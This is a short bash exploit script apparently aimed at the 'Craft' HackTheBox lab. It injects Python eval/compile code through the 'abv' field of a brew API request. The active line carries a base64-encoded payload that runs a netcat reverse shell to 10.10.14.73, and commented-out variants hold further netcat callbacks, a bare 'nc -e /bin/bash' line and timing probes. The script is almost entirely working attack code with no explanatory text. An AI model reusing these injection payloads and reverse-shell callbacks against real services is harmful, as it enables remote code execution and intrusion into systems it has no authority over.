#!/bin/bash
token=$(./token.sh)
echo Using token: $token

#evil="'eval(compile("import os; print os.curdir", "none", "exec"))')"
#echo $evil

#curl -v -H "X-Craft-API-Token: $token" -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"id": 5467, "name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "eval(compile("import os; os.system(\"nc 10.10.15.129 4530\")", "none", "exec")) # "))}'
#curl -v -H "X-Craft-API-Token: $token" -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"id": 5467, "name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "eval(compile("""import base64;import os;eval(base64.decodestring("b3Muc3lzdGVtKCduYyAxMC4xMC4xNC45MCA0NTMwJykK"))""","none","exec"))#"}'
### THE BELOW shouldbe good
#curl -v -H "Content-Type: application/json" -k -X POST http://localhost:5000/api/brew/ --data '{"id": 5467, "name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "eval(compile(\"\"\"import base64;import os;eval(base64.decodestring(b\"b3Muc3lzdGVtKCduYyAxMC4xMC4xNC45MCA0NTMwJykK\"))\"\"\",\"none\",\"exec\"))#"}'
#os.system('nc 10.10.14.93 4530 -e /bin/bash')
curl -v -H "X-Craft-API-Token: $token" -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"id": 5467, "name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "eval(compile(\"\"\"import base64;import os;eval(base64.decodestring(b\"b3Muc3lzdGVtKCduYyAxMC4xMC4xNC43MyA0NTMwIC1lIC9iaW4vc2gnKQo=\"))\"\"\",\"none\",\"exec\"))#"}'
#curl -v -H "X-Craft-API-Token: $token" -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data "{"id": 5467, "name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "eval(compile('''import base64;import os;eval(base64.decodestring('b3Muc3lzdGVtKCduYyAxMC4xMC4xNC45MCA0NTMwJykK'))''','none','exec'))#"}"
#curl -v -H "X-Craft-API-Token: $token" -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"id": 5467, "name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "eval(\"False\") #"}'
#curl -v -H "X-Craft-API-Token: $token" -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"id": 5467, "name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "eval(compile("import time; time.sleep(5)","none","exec"))#"}'
#echo curl -v -H "X-Craft-API-Token: $token" -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"id": 5467, "name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "eval(compile("""import base64;import os;eval(base64.decodestring("b3Muc3lzdGVtKCduYyAxMC4xMC4xNC45MCA0NTMwJykK"))""","none","exec"))#"))}'
#echo curl -v -H "X-Craft-API-Token: $token" -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"id": 5467, "name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "eval(compile("import os; print os.curdir", "none", "exec")) # "}'


